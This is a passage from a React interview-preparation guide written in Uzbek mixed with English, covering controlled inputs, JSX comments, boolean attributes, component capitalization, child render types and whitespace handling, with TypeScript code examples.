  onBlur={(e) => commit(e.target.value)}       // focus loss
/>
```

**Controlled with formatting:**

```tsx
function PhoneInput() {
  const [phone, setPhone] = useState("");

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const digits = e.target.value.replace(/\D/g, "");
    const formatted = digits.replace(/(\d{3})(\d{3})(\d{4})/, "($1) $2-$3");
    setPhone(formatted);
  };

  return <input value={phone} onChange={handleChange} placeholder="(555) 123-4567" />;
}
// Type "5551234567" → "(555) 123-4567"
```

**Uncontrolled + ref pattern:**

```tsx
function FileUpload() {
  const fileInputRef = useRef<HTMLInputElement>(null);

  const handleSubmit = () => {
    const file = fileInputRef.current?.files?.[0];
    if (file) {
      uploadFile(file);
    }
  };

  return (
    <>
      <input type="file" ref={fileInputRef} />
      <button onClick={handleSubmit}>Upload</button>
    </>
  );
}
// File input — uncontrolled (security/browser limit)
```

**`useActionState` (R19, eski nomi `useFormState`) — alternative pattern:**

```tsx
import { useActionState } from "react";

function Form() {
  const [state, action, isPending] = useActionState(
    async (prev: string, formData: FormData) => {
      return formData.get("name") as string;
    },
    ""
  );

  return (
    <form action={action}>
      <input name="name" defaultValue={state} />  {/* uncontrolled */}
      <button disabled={isPending}>Submit</button>
    </form>
  );
}
```

R19 form actions — uncontrolled-friendly pattern.

**`null`/`undefined` value:**

```tsx
// ⚠️ value={null} or value={undefined} — controlled → uncontrolled
const [value, setValue] = useState<string | null>(null);
<input value={value} />  // Warning: changing from controlled to uncontrolled

// ✅ Default
<input value={value ?? ""} />
```

**Number input quirks:**

```tsx
const [n, setN] = useState(0);
<input type="number" value={n} onChange={(e) => setN(Number(e.target.value))} />

// User types "1.5":
// e.target.value = "1.5"
// Number("1.5") = 1.5 → setN(1.5)
// Input shows "1.5"

// User types "1.":
// e.target.value = "1." (intermediate)
// Number("1.") = 1 → setN(1)
// Input shows "1" — user can't type decimal!

// Fix: store as string
const [n, setN] = useState("0");
<input type="number" value={n} onChange={(e) => setN(e.target.value)} />
const numericValue = parseFloat(n) || 0;
```

</details>

### Edge Cases

- **`value={undefined}`**: React warning. Use `value ?? ""`.
- **`value={null}`**: Same as above.
- **Read-only**: `<input value="X" readOnly />` — controlled but explicitly read-only.
- **Programmatic value change without onChange**: `inputRef.current.value = "X"` — controlled component'da React keyingi render'da o'z value'ini majburlaydi.

### Follow-up savollar

- "`<select>` controlled qanday?" — `value={selectedOption}` + `onChange`. Multi-select — `value={[1, 2]}` + `multiple` attribute.
- "Form library qachon afzal?" — Ko'p field, validation, async, complex submit. React Hook Form (uncontrolled-leaning) tezroq.
- "Debounced controlled input — qanday qilish?" — `useDebounce` custom hook bilan. Local state immediate update, debounced state effect/parent ga yetadi.

</details>

---

### 42. JSX comments — `{/* */}` nima uchun, `//` nima uchun ishlamaydi? [Junior+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

JSX ichida (tag'lar orasida) **`{/* */}`** ishlatiladi — JSX expression slot ichida JS comment. **`<!-- -->`** (HTML) ishlamaydi — JSX HTML emas. **`//`** ishlamaydi chunki JSX text node'lar yoki expression'lar sifatida parse qilinadi — line comment qabul qilinmaydi (text bo'lib qoladi). JSX attribute'larida — oddiy JS comment (`{/* */}` yoki yangi qatorda `//`).

### To'liq tushuntirish

**Comment patterns:**

| Joy | Syntax | Misol |
|-----|--------|-------|
| JSX child slot | `{/* */}` | `<div>{/* comment */}</div>` |
| JSX attribute | `{/* */}` yoki yangi qator | `<div className="x" /* */ />` |
| JS expression ichida | `//` yoki `/* */` | `{name /* user name */}` |
| Komponent function body | `//` yoki `/* */` | normal JS |
| ❌ HTML-style | `<!-- -->` | not allowed |
| ❌ Text comment | `// inside JSX text` | render bo'lib qoladi |

### Kod misoli

```tsx
function App() {
  // ✅ Function body — normal JS comment
  // Bu komponent foydalanuvchi profile'ini ko'rsatadi
  const greeting = "Hello";  // inline comment

  return (
    <div className="app" /* attribute paytida ham */>
      {/* ✅ JSX child slot — comment */}

      <h1>
        {/* Variable comment */}
        {greeting}, World
      </h1>

      {/* Multi-line
          comment
          OK */}

      {/*
        ✅ Conditional render explanation
        - admin → AdminPanel
        - user → UserPanel
      */}
      {user.isAdmin ? <AdminPanel /> : <UserPanel />}

      {/* ❌ HTML comment — not parsed */}
      {/* <!-- This won't work --> */}

      {/* ❌ Inline // comment — text bo'lib qoladi */}
      {/* <div>// not a comment, renders as text</div> */}
    </div>
  );
}

// ❌ Anti-pattern — // text node ichida
function Bad() {
  return (
    <p>
      Hello
      // This is NOT a comment — renders as text "// This is NOT a comment"
    </p>
  );
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**JSX parser behavior:**

```tsx
// Source
<div>
  Hello
  {/* comment */}
  World
</div>

// Parsed as
{
  type: "div",
  children: [
    "Hello",
    /* comment is dropped */
    "World"
  ]
}
```

JSX'da `{...}` — JavaScript expression slot. Inside — JS expression. JS comment (`/* */`) expression sifatida valid (returns undefined, ignored).

**Why HTML comment fails:**

```tsx
<div>
  <!-- comment -->  {/* SyntaxError */}
</div>

// JSX parser: <!-- not valid JSX/HTML mix
// React strict — XML-like but not HTML
```

**`//` line comment limitation:**

```tsx
<div>
  {
    // ✅ Inside expression — line comment OK
    name
  }
</div>

<div>
  // ❌ Outside expression — text "// ..." renders
  Text content
</div>
```

`//` line comment — JS expression context'da OK. JSX text context'da — text.

**Multi-line comment outside attribute:**

```tsx
<div
  className="x"
  /* ✅ between attributes */
  id="y"
>
  ...
</div>
```

**Comment in conditional:**

```tsx
{/* Header */}
<header>
  {/* Title */}
  <h1>App</h1>
</header>

{/* Main content */}
<main>
  {data /* user data */ && <UserView data={data} />}
</main>
```

**Babel preserves comments:**

```tsx
// Source
<div>
  {/* important note */}
  Content
</div>

// Compiled (Automatic)
_jsx("div", { children: "Content" });
// Comment dropped — not in output
```

Comments — dev-only, runtime'ga ta'sir qilmaydi.

**TypeScript JSDoc comments:**

```tsx
/**
 * UserCard komponenti — user ma'lumotini ko'rsatadi
 * @param props - User object props
 * @returns JSX element
 */
function UserCard(props: { user: User }) {
  return <div>{props.user.name}</div>;
}
```

JSDoc — TypeScript hover/IntelliSense uchun ishlatiladi.

**Comment placement edge cases:**

```tsx
// ✅ Top-level
function Component() {
  // Body comment
  return (
    /* Return comment */
    <div>
      {/* Child comment */}
    </div>
  );
}

// ❌ Inside text
<p>Some text {/* this OK */} more text</p>
// Renders: "Some text  more text" (extra space possible)
```

**Linting:**

```typescript
// ESLint react/jsx-no-comments-in-strings — prevents comments inside strings
{/* tip: don't write {`Hello /* note */ World`} — runs as expression */}
```

</details>

### Edge Cases

- **`{/* */}` returns `undefined`**: JSX skip undefined render. No render.
- **`{/* {expression} */}`**: Outer comment, inner expression — expression NOT executed (commented out).
- **String'da comment**: `<p>{"text /* not a comment */"}</p>` — string literal, comment text bo'lib qoladi.

### Follow-up savollar

- "JSX'da TODO comment qanday yoziladi?" — `{/* TODO: implement validation */}` — standard pattern.
- "Conditional render'ni comment'ga o'rash mumkinmi?" — Ha, `{/* {showFeature && <Feature />} */}` — feature disable.
- "Comment'da JSX yozsa nima bo'ladi?" — `{/* <Component /> */}` — string sifatida tushuniladi (JSX parse qilinmaydi).

</details>

---

### 43. Boolean attributes — `disabled={false}` semantikasi va `disabled="false"` farqi [Middle]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

JSX'da boolean attribute uchta shaklga ega: **shorthand** (`disabled`), **explicit true** (`disabled={true}`), **explicit false** (`disabled={false}`). False — attribute DOM'dan **olib tashlanadi**. HTML'dan farqli ravishda — HTML'da `disabled="false"` HALI ham disabled (attribute mavjudligi muhim, value emas). String `"false"` JSX'da — true (truthy string).

### To'liq tushuntirish

**Boolean prop variants:**

```tsx
// ✅ Shorthand (= true)
<input disabled />

// ✅ Explicit true
<input disabled={true} />

// ✅ Explicit false (attribute removed from DOM)
<input disabled={false} />

// ⚠️ String "false" — TRUTHY in JS!
<input disabled="false" />  // → DOM disabled attribute SET
```

**HTML vs JSX behavior:**

| HTML | JSX | DOM result |
|------|-----|------------|
| `<input disabled>` | `<input disabled />` | disabled |
| `<input disabled="">` | `<input disabled="" />` | disabled (HTML attribute mavjud) |
| `<input disabled="true">` | `<input disabled="true" />` | disabled |
| `<input disabled="false">` | `<input disabled="false" />` | disabled (HTML), disabled (JSX — string truthy) |
| (yo'q) | `<input disabled={false} />` | NOT disabled (JSX removes attr) |
| (yo'q) | `<input disabled={true} />` | disabled |

### Kod misoli

```tsx
function Form({ isLoading, isValid }: { isLoading: boolean; isValid: boolean }) {
  return (
    <form>
      {/* ✅ Boolean conditional */}
      <button disabled={isLoading || !isValid}>
        Submit
      </button>

      {/* ✅ Multiple booleans */}
      <input
        type="checkbox"
        checked={isValid}        // controlled
        disabled={isLoading}
        readOnly={!editable}
        autoFocus={isFirstField}
      />

      {/* ❌ Common mistake — string "false" */}
      <button disabled={isLoading ? "false" : "true"}>  {/* Always disabled! */}
        Wrong
      </button>

      {/* ✅ To'g'ri — boolean expression */}
      <button disabled={!!isLoading}>
        Right
      </button>
    </form>
  );
}
```

**Common HTML boolean attributes:**

```tsx
<input
  disabled
  required
  readOnly
  autoFocus
  multiple    // <select multiple>, <input type="file" multiple>
  checked     // <input type="checkbox/radio">
  selected    // <option selected>
/>

<button disabled formNoValidate />
<form noValidate />
<video autoPlay loop muted controls playsInline />
<details open />
<dialog open />
<script async defer />
<iframe allowFullScreen />
<table>
  <td colSpan={2} rowSpan={3} />
</table>
```

<details>
<summary><strong>Deep Dive</strong></summary>

**JSX boolean handling — internal:**

```typescript
// React DOM source (sodda)
function setAttribute(element, name, value) {
  if (value === false || value === null || value === undefined) {
    // Remove attribute
    element.removeAttribute(name);
  } else if (value === true) {
    // Set boolean attribute (no value)
    element.setAttribute(name, "");
  } else {
    // String value
    element.setAttribute(name, String(value));
  }
}
```

**HTML spec — boolean attributes:**

HTML5 spec'da boolean attribute — **mavjudligi muhim, value emas**:

```html
<!-- HTML — barchasi bir xil disabled -->
<input disabled>
<input disabled="">
<input disabled="disabled">
<input disabled="false">
<input disabled="true">
```

JSX — JS-friendly — value matters:

```tsx
{/* JSX — disabled depends on value */}
<input disabled />          {/* disabled */}
<input disabled={true} />   {/* disabled */}
<input disabled={false} />  {/* NOT disabled (attribute removed) */}
<input disabled="false" />  {/* disabled — string truthy */}
```

**`null`/`undefined` value:**

```tsx
<input disabled={null} />       // attribute removed
<input disabled={undefined} />  // attribute removed
<input disabled={0} />          // attribute removed (0 is falsy in React)

// ⚠️ Wait — 0 is falsy but not boolean. React DOM source:
// Actually, only false/null/undefined remove attribute.
// 0 — set as "0" (truthy in HTML).
```

Aniqroq:

```typescript
// React DOM (R19)
function shouldRemoveAttribute(name, value, propertyInfo) {
  if (value === null || value === undefined) return true;
  if (propertyInfo?.type === BOOLEAN) {
    return value === false;  // boolean attribute false → remove
  }
  return false;
}
```

**Custom Element boolean (R19):**

```tsx
// Web Component
<my-toggle active={true} />   // property assignment (R19+)
<my-toggle active />          // attribute "" set
<my-toggle active={false} />  // attribute removed
```

R19'da Web Components properties as assignment — JS object pass.

**Aria attributes — strings:**

```tsx
{/* ⚠️ aria-* — string, not boolean */}
<button aria-pressed="true" />   // ✅ string
<button aria-pressed={true} />   // ⚠️ becomes "true" string (React converts)
<button aria-pressed={isPressed.toString()} />  // explicit
```

ARIA spec — string values ("true"/"false"/"mixed"). React converts boolean → string for aria-*.

**Data attributes:**

```tsx
{/* data-* — string values */}
<div data-active={true} />   // → data-active="true"
<div data-active={false} />  // → data-active="false" (NOT removed)
<div data-count={5} />        // → data-count="5"
```

**`hidden` attribute:**

```tsx
<div hidden={isHidden} />
// hidden — boolean
// CSS equivalent: display: none

// hidden="until-found" (R19, search support)
<div hidden="until-found" />
```

**Boolean component prop:**

```tsx
interface ButtonProps {
  primary?: boolean;
  disabled?: boolean;
}

function Button({ primary, disabled }: ButtonProps) {
  return (
    <button
      className={primary ? "btn-primary" : "btn-default"}
      disabled={disabled}
    >
      Click
    </button>
  );
}

<Button primary />              // primary=true
<Button primary={false} />      // primary=false
<Button />                      // primary=undefined
<Button disabled />             // disabled=true
```

**TypeScript ESLint rules:**

```typescript
// jsx-boolean-value
{
  rules: {
    "react/jsx-boolean-value": ["error", "never"]  // <Foo bar /> over <Foo bar={true} />
  }
}
```

</details>

### Edge Cases

- **`disabled={undefined}`**: Attribute removed. Same as `false`.
- **`disabled={null}`**: Attribute removed.
- **`disabled={0}`**: ⚠️ `0` falsy — but React docs imply only `false/null/undefined` remove. Actual behavior: numeric value sets attribute. Edge case.
- **String "" (empty)**: `disabled=""` → attribute set with empty value (HTML standard).

### Follow-up savollar

- "Why does JSX behave differently from HTML?" — JS-friendly. Boolean variables natural usage. HTML legacy (string-only attributes).
- "How to check disabled state in event handler?" — `e.currentTarget.disabled` returns boolean (DOM property). `getAttribute('disabled')` returns string or null.
- "ARIA boolean attributes — string mi boolean mi?" — String per ARIA spec. React converts (but explicit string better).

</details>

---

### 44. JSX namespace — capitalization rule (lowercase=HTML, uppercase=Component) [Middle]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

JSX'da **lowercase tag** (`<div>`, `<button>`) — HTML/SVG element sifatida tushuniladi (`_jsx("div", ...)` — string type). **Uppercase tag** (`<MyComponent>`, `<Card>`) — JavaScript variable sifatida tushuniladi (`_jsx(MyComponent, ...)` — function/class type). Bu rule Babel/SWC compile-time'da hal qilinadi. Lowercase variable JSX'da ishlamaydi — string'ga aylantiriladi (DOM tag).

### To'liq tushuntirish

**Naming convention:**

| Tag | Interpretation | Compile output |
|-----|----------------|-----------------|
| `<div>` | HTML/SVG tag | `_jsx("div", ...)` |
| `<my-element>` | Custom Element (kebab-case) | `_jsx("my-element", ...)` |
| `<MyComponent>` | JS variable (function/class) | `_jsx(MyComponent, ...)` |
| `<obj.Component>` | Member access | `_jsx(obj.Component, ...)` |
| `<my-component>` (lowercase var) | ❌ HTML tag deb tushuniladi | `_jsx("my-component", ...)` (custom element) |

### Kod misoli

```tsx
// ✅ HTML tag (lowercase)
<div className="container">...</div>

// ✅ Custom Element (kebab-case)
<my-element />

// ✅ React Component (Capitalized)
<Header />
<UserProfile user={user} />

// ❌ Lowercase variable
const myComponent = () => <p>Hello</p>;

function App() {
  return <myComponent />;  // ❌ Renders as <mycomponent /> HTML tag
  // myComponent variable NOT used!
}

// ✅ Capitalized
const MyComponent = () => <p>Hello</p>;
function App() {
  return <MyComponent />;  // ✅ Function called
}
```

**Member access (obj.Component) — Capitalized members:**

```tsx
// Module pattern
const Card = {
  Header: ({ children }: { children: React.ReactNode }) => <div className="header">{children}</div>,
  Body: ({ children }: { children: React.ReactNode }) => <div className="body">{children}</div>,
  Footer: ({ children }: { children: React.ReactNode }) => <div className="footer">{children}</div>,
};

function App() {
  return (
    <div>
      <Card.Header>Title</Card.Header>      {/* ✅ JS member access */}
      <Card.Body>Content</Card.Body>
      <Card.Footer>Actions</Card.Footer>
    </div>
  );
}
```

**Dynamic component:**

```tsx
function App({ tag }: { tag: string }) {
  // ❌ Lowercase variable
  return <tag>Content</tag>;  // <tag>Content</tag> HTML — wrong!

  // ✅ Capitalized variable
  const Tag = tag as React.ElementType;
  return <Tag>Content</Tag>;  // ✅ Variable used
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**Babel/SWC compile rule:**

```typescript
// JSX parser logic (sodda)
function compileJSXTag(tag) {
  if (/^[a-z]/.test(tag)) {
    // Lowercase — string (HTML element)
    return `_jsx("${tag}", ...)`;
  } else {
    // Uppercase — JS expression
    return `_jsx(${tag}, ...)`;
  }
}

// `<div>` → `_jsx("div", ...)`
// `<MyComp>` → `_jsx(MyComp, ...)`
// `<obj.Item>` → `_jsx(obj.Item, ...)` (member access detected)
```

**Why this convention:**

JS variable nomlari ko'pincha lowercase (`myVariable`). HTML tag'lar lowercase (`<div>`). Conflict — ajralish kerak. React/JSX convention: **PascalCase = component**.

```tsx
// Without rule (theoretical):
<button />     // HTML or component?
<header />     // HTML <header> or React Header?

// With rule:
<button />     // HTML <button>
<Header />     // React component Header
```

**Custom Elements (Web Components):**

```tsx
// Custom Elements — kebab-case (W3C standard)
<my-button />          // ✅ Custom Element
<google-map lat={x} />  // ✅ Custom Element

// React renders as DOM element (not component)
// Properties forwarded as attributes (R19+ properties)
```

**Edge case — lowercase JS variable:**

```tsx
const button = (props: any) => <input {...props} />;

function App() {
  return <button />;  // ⚠️ <button> HTML tag, NOT the variable
}

// Workaround: Capitalize
const Button = (props: any) => <input {...props} />;
function App() {
  return <Button />;  // ✅ Variable used
}
```

**Member access detection:**

```tsx
// JSX parser checks for `.` in tag
<obj.Component />       // member access — uses obj.Component variable
<obj.subobj.Component />  // ✅ OK
<obj-bad.Component />   // ❌ syntax error
```

**Capital and lowercase mixed:**

```tsx
// `my-comp` (kebab-case) — Custom Element
<my-comp />

// `MyComp` — React component
<MyComp />

// `myComp` — ⚠️ HTML tag "mycomp" (browser warning: unknown element)
<myComp />

// `XMLHttpRequest` — uppercase first letter — component
<XMLHttpRequest />  // React looks for `XMLHttpRequest` variable
```

**TypeScript JSX namespace:**

```typescript
// React's intrinsic elements
declare namespace JSX {
  interface IntrinsicElements {
    div: HTMLAttributes<HTMLDivElement>;
    button: ButtonHTMLAttributes<HTMLButtonElement>;
    // ... 200+ HTML elements
    "custom-element": { foo: string };  // Custom Element declared
  }
}
```

**Custom Element TypeScript:**

```tsx
// Augment JSX namespace for Custom Element
declare global {
  namespace React {
    namespace JSX {
      interface IntrinsicElements {
        "my-button": React.HTMLAttributes<HTMLElement> & {
          variant?: string;
        };
      }
    }
  }
}

// Usage
<my-button variant="primary" />  // ✅ TypeScript-aware
```

**ESLint rule:**

```json
{
  "rules": {
    "react/jsx-pascal-case": "error"  // enforce PascalCase for components
  }
}
```

**Dynamic tag with type safety:**

```tsx
function Polymorphic<E extends React.ElementType = "div">({
  as,
  children,
  ...rest
}: {
  as?: E;
  children?: React.ReactNode;
} & React.ComponentPropsWithoutRef<E>) {
  const Tag = as || "div";
  return <Tag {...rest}>{children}</Tag>;
}

<Polymorphic as="section" id="hero">Content</Polymorphic>
<Polymorphic as="a" href="/about">Link</Polymorphic>
```

</details>

### Edge Cases

- **`<this.Component />`**: Class instance member — works (class component context).
- **String tag from variable**: `const Tag = "div"; <Tag />` — Capitalized variable holding string, treated as Component reference (props normalized).
- **Underscore-prefixed**: `<_Component />` — `_` lowercase, parsed as HTML tag.
- **Numeric prefix**: `<1Component />` — invalid identifier, syntax error.

### Follow-up savollar

- "What if I want lowercase component name?" — Not possible directly. Use member access (`obj.component`) or alias (`const Foo = obj.foo`).
- "Why doesn't JSX support mixed case?" — Convention picked for clarity. Babel/SWC strict.
- "Can I use CamelCase for HTML tags?" — `<Div>` would be looked up as React component variable. Native HTML elements lowercase only.

</details>

---

### 45. JSX child types — string, number, null, false, array — render farqi [Middle]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

JSX child sifatida render qilinadigan turlar: **string** (text node), **number** (text node), **JSX element** (React Element), **array** (children list — keys kerak), **fragment** (group). **Skip qilinadigan**: `null`, `undefined`, `false`, `true`, `[]` (empty array). **Trap**: `0`, `NaN` — falsy, lekin text node sifatida render qilinadi.

### To'liq tushuntirish

**Renderable child types:**

| Type | Misol | Render |
|------|-------|--------|
| `string` | `<p>{"Hello"}</p>` | Text node "Hello" |
| `number` | `<p>{42}</p>` | Text node "42" |
| `bigint` | `<p>{42n}</p>` | Text node "42" |
| `JSX Element` | `<p>{<span />}</p>` | Nested element |
| `Array` | `<p>{[1, 2, 3]}</p>` | "123" (no separator) |
| `Fragment` | `<><h1>A</h1><p>B</p></>` | Multiple siblings |
| `Iterable` | `<p>{new Set([1,2])}</p>` | ❌ Error (not directly) |
| `Date` | `<p>{new Date()}</p>` | ❌ Error |
| Plain object | `<p>{ {a: 1} }</p>` | ❌ Error: "Objects are not valid as a React child" |

**Skipped (no render):**

| Value | Render |
|-------|--------|
| `null` | Skip (no node) |
| `undefined` | Skip |
| `true` | Skip |
| `false` | Skip |
| `[]` (empty array) | Skip |

**Trap (renders unexpectedly):**

| Value | Render |
|-------|--------|
| `0` | Text "0" (falsy but renders) |
| `NaN` | Text "NaN" |
| `""` | Empty (no visible) |
| `" "` (space) | Text " " (visible space) |

### Kod misoli

```tsx
function Demo() {
  const data = [
    { value: "Hello", label: "string" },
    { value: 42, label: "number" },
    { value: 0, label: "zero (renders!)" },
    { value: NaN, label: "NaN (renders!)" },
    { value: null, label: "null (skipped)" },
    { value: undefined, label: "undefined (skipped)" },
    { value: false, label: "false (skipped)" },
    { value: true, label: "true (skipped)" },
    { value: [], label: "empty array (skipped)" },
    { value: [1, 2, 3], label: "array (renders 123)" },
    { value: <span>span</span>, label: "JSX element" },
  ];

  return (
    <div>
      {data.map((item, i) => (
        <div key={i}>
          {item.label}: [{item.value}]
        </div>
      ))}
    </div>
  );
}

// Output:
// string: [Hello]
// number: [42]
// zero (renders!): [0]            ← bug-prone!
// NaN (renders!): [NaN]           ← bug-prone!
// null (skipped): []
// undefined (skipped): []
// false (skipped): []
// true (skipped): []
// empty array (skipped): []
// array (renders 123): [123]
// JSX element: [span]
```

**`&&` 0 trap classic:**

```tsx
function Cart({ items }: { items: Item[] }) {
  return (
    <div>
      {items.length && <Items items={items} />}
      {/* ⚠️ items=[] → 0 renders as text "0" */}
    </div>
  );
}

// Fix
{items.length > 0 && <Items items={items} />}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**React internal — child rendering:**

```typescript
// React internal (sodda)
function reconcileChildren(parent, children) {
  if (children === null || children === undefined) return;
  if (typeof children === "boolean") return;  // skip true/false

  if (typeof children === "string" || typeof children === "number") {
    // Text node
    createTextNode(parent, String(children));
    return;
  }

  if (Array.isArray(children)) {
    // Iterate
    children.forEach((child) => reconcileChildren(parent, child));
    return;
  }

  if (children.$$typeof === REACT_ELEMENT_TYPE) {
    // Element
    reconcileElement(parent, children);
    return;
  }

  // Object — error
  throw new Error("Objects are not valid as a React child");
}
```

**`0` rendering — JavaScript falsy semantics:**

```typescript
// && operator
0 && <Component />  // → 0 (short-circuit at falsy)

// JSX child
{0}  // → "0" text node (falsy values: null/undefined/false skipped, 0/NaN render)
```

React's design — only `null/undefined/false` are skip-worthy. `0` is data (e.g., count, ID) — should be visible.

**Object as child — error:**

```tsx
const user = { name: "Ali", age: 30 };

<p>{user}</p>  // ❌ "Objects are not valid as a React child"

// Fix — explicit
<p>{user.name}</p>  // ✅ string
<p>{JSON.stringify(user)}</p>  // ✅ string
```

**Date object:**

```tsx
const date = new Date();

<p>{date}</p>  // ❌ Error
<p>{date.toString()}</p>  // ✅
<p>{date.toISOString()}</p>  // ✅
<p>{date.toLocaleDateString()}</p>  // ✅
```

**Iterable (Set, Map, Generator):**

```tsx
const set = new Set([1, 2, 3]);

<p>{set}</p>  // ❌ Error
<p>{[...set]}</p>  // ✅ array (renders "123")
<p>{Array.from(set)}</p>  // ✅
```

R18+ supports iterables in some contexts, lekin direct child — error.

**Symbol:**

```tsx
const sym = Symbol("x");

<p>{sym}</p>  // ❌ Error: "Symbols are not valid as a React child"
<p>{sym.toString()}</p>  // ✅ "Symbol(x)"
```

**Function as child (function-as-children pattern):**

```tsx
// Render prop pattern
function DataProvider({ children }: { children: (data: Data) => React.ReactNode }) {
  const data = useData();
  return <>{children(data)}</>;  // call function, return JSX
}

// Usage
<DataProvider>
  {(data) => <div>{data.name}</div>}
</DataProvider>
```

**Promise as child (R19 with `use()`):**

```tsx
function AsyncContent({ promise }: { promise: Promise<Data> }) {
  const data = use(promise);  // ✅ R19 — read promise
  return <div>{data.name}</div>;
}

// ❌ Pre-R19 — direct promise child error
<p>{somePromise}</p>  // ❌
```

**Array vs Fragment:**

```tsx
// Array — keys required
<p>{[
  <span key="a">A</span>,
  <span key="b">B</span>
]}</p>

// Fragment — no keys
<p>
  <>
    <span>A</span>
    <span>B</span>
  </>
</p>
```

**Nested arrays — flatten:**

```tsx
const items = [[1, 2], [3, 4]];

<p>{items}</p>  // → "1234" (auto-flatten)
<p>{items.flat()}</p>  // explicit flatten
```

**`String()` conversion for safety:**

```tsx
function SafeText({ value }: { value: unknown }) {
  if (value === null || value === undefined) return null;
  return <p>{String(value)}</p>;  // any → string
}
```

**0 trap fixes:**

```tsx
// Comparison
{count > 0 && <Component />}

// Boolean cast
{!!count && <Component />}
{Boolean(count) && <Component />}

// Ternary (most explicit)
{count > 0 ? <Component /> : null}

// Null check (for ID-like values)
{userId != null && <Profile id={userId} />}
```

</details>

### Edge Cases

- **`{null && ...}`**: `null` (skip, no render).
- **`{undefined && ...}`**: `undefined` (skip).
- **`{[] && ...}`**: Empty array TRUTHY — renders `<Component />`.
- **`{"" && ...}`**: Empty string FALSY — renders empty (no node).

### Follow-up savollar

- "Why doesn't React skip `0`?" — Data semantic. Counts, IDs are valid display values.
- "How does Date child work in Vue/Svelte?" — Vue auto `.toString()`. Svelte direct `{date}` valid (template). React stricter.
- "Can I render Map keys?" — `[...map.keys()]` array. Direct `{map}` error.

</details>

---

### 46. JSX whitespace handling — text nodes va spaces [Middle+]

<details>
<summary><strong>Javob</strong></summary>

### Qisqa javob

JSX whitespace **ba'zi joyda saqlanadi, ba'zi joyda olib tashlanadi**: tag boundary'larida (newline + indentation) — olib tashlanadi, **content middle'da** (text orasidagi space) — saqlanadi. Adjacent expressions space'siz qoladi (`{a}{b}` → "AB", `{a} {b}` → "A B"). Explicit space — `{" "}` yoki template literal `{`${a} ${b}`}`.

### To'liq tushuntirish

**Whitespace rules:**

| Pattern | Render |
|---------|--------|
| `<p>Hello World</p>` | "Hello World" (single space preserved) |
| `<p>Hello\nWorld</p>` (newline) | "Hello World" (newline → space) |
| `<p>Hello   World</p>` (multiple spaces) | "Hello World" (collapsed to single?) |
| `<p>{a}{b}</p>` | "AB" (no space) |
| `<p>{a} {b}</p>` | "A B" |
| `<p>{a}{" "}{b}</p>` | "A B" (explicit space) |
| `<p>\n  Hello\n  World\n</p>` | "Hello World" (boundary trimmed) |

### Kod misoli

```tsx
const firstName = "Ali";
const lastName = "Karimov";

function Examples() {
  return (
    <>
      {/* No space — "AliKarimov" */}
      <p>{firstName}{lastName}</p>

      {/* JSX text space — "Ali Karimov" */}
      <p>{firstName} {lastName}</p>

      {/* Explicit space expression — "Ali Karimov" */}
      <p>{firstName}{" "}{lastName}</p>

      {/* Template literal — "Ali Karimov" */}
      <p>{`${firstName} ${lastName}`}</p>

      {/* Newline trimmed at boundary — "Hello World" */}
      <p>
        Hello World
      </p>

      {/* Multi-line — newline becomes space */}
      <p>
        Hello
        World
      </p>
      {/* Renders: "Hello World" (newline → space) */}

      {/* Adjacent expressions on different lines — NO space */}
      <p>
        {firstName}
        {lastName}
      </p>
      {/* Renders: "AliKarimov" — newline between {} stripped */}
    </>
  );
}
```

<details>
<summary><strong>Deep Dive</strong></summary>

**JSX text node parsing:**

```typescript
// JSX parser (sodda)
function parseJSXText(text) {
  // Trim leading/trailing whitespace at boundaries
  text = text.replace(/^[\n\r]\s*/, "");  // start newline + whitespace
  text = text.replace(/[\n\r]\s*$/, "");  // end newline + whitespace

  // Collapse multiple whitespace to single space
  text = text.replace(/\s+/g, " ");

  // Empty after trim — skip
  if (!text) return null;

  return text;
}
```

**Babel JSX text rules (official):**

```tsx
<p>
  Hello World
</p>
// Compiled: _jsx("p", { children: "Hello World" })
// Newlines + indent stripped, internal spaces preserved

<p>
  Hello
  World
</p>
// Compiled: _jsx("p", { children: "Hello World" })
// Newline between words → single space

<p>
  Hello{" "}
  World
</p>
// Compiled: _jsx("p", { children: ["Hello", " ", "World"] })
// Explicit space preserved
```

**Adjacent expressions:**

```tsx
<p>{a}{b}</p>
// Compiled: _jsx("p", { children: [a, b] })
// React renders: "ab" (no separator)

<p>{a} {b}</p>
// Compiled: _jsx("p", { children: [a, " ", b] })
// Space text node between

<p>{a}
{b}</p>
// Compiled: _jsx("p", { children: [a, b] })
// Newline+indent stripped between expressions
```

**Common pattern — username display:**

```tsx
// ❌ Inconsistent spacing
<span>{firstName}{lastName}</span>  // "AliKarimov"

// ✅ Multiple ways to add space
<span>{firstName} {lastName}</span>            // JSX text space
<span>{firstName}{" "}{lastName}</span>        // explicit
<span>{`${firstName} ${lastName}`}</span>      // template literal
<span>{[firstName, lastName].join(" ")}</span> // array join
```

**Deliberate empty space — `&nbsp;` alternative:**

```tsx
<span>Click&nbsp;here</span>
// JSX: HTML entity OK in text

<span>Click{" "}here</span>  // explicit non-breaking space (Unicode)
<span>Click{"\xA0"}here</span>     // alternative
```

**`&nbsp;` in JSX:**

```tsx
<p>Click&nbsp;here</p>
// HTML entity passes through — renders non-breaking space

<p>Foo &amp; Bar</p>  // → "Foo & Bar"
<p>Less than &lt; greater</p>  // → "Less than < greater"
```

**Multi-line strings:**

```tsx
// ❌ Multi-line string with `\n` won't display visibly
<p>{"Line 1\nLine 2"}</p>
// Renders: "Line 1 Line 2" (browser collapses \n in HTML)

// ✅ Use <br /> or CSS white-space: pre-line
<p>Line 1<br />Line 2</p>
<p style={{ whiteSpace: "pre-line" }}>{"Line 1\nLine 2"}</p>
```

**Whitespace in attribute values:**

```tsx
// Attribute strings preserve spaces
<input placeholder="  Search...  " />  // 2 leading + 2 trailing spaces
<button title="Click   me">Click</button>  // multiple spaces preserved

// Expression values — JS strings (no JSX whitespace handling)
<input placeholder={"   Search   "} />  // exact string
```

**`pre`-formatted text:**

```tsx
<pre>
  Line 1
  Line 2
  Line 3
</pre>
// CSS: white-space: pre — renders newlines + whitespace as-is
```

**Code blocks (Markdown rendering):**

```tsx
const code = `
function foo() {
  return 42;
}
`;

<pre><code>{code}</code></pre>
// Newlines preserved (pre)
```

